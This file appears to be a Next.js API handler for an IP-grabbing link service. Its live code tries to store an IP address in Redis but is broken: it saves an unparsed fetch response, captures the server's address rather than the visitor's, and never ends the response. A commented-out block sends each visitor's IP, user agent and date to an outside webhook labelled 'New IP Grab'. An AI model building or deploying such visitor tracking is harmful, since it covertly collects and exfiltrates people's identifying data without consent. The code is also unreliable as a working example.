import type { NextApiRequest, NextApiResponse } from 'next'
import redis from '../../src/util/redis';

export default async (req: NextApiRequest, res: NextApiResponse) => {

    let d = new Date();

    let userIp = await fetch("http://api.ipify.org/?format=json");

    await redis.hmset("links", {
        ip: userIp
    })

    // if(req['headers'])
    // fetch({
    //     method: 'post',
    //     url: ipWebhook,
    //     data: {
    //     username: "New IP Grab",
    //     avatar_url: "https://www.houseofcharity.org/wp-content/uploads/2019/07/White-Square.jpg",
    //     embeds: [{
    //         "description": `**IP:**\n${req["headers"]["x-real-ip"]}\n\n**User Agent:**\n${req["headers"]["user-agent"]}\n\n**Date:** ${d}\n_ _`,
    //         "color": 0
    //         }]
    //     }
    // });

    res.status(200);
}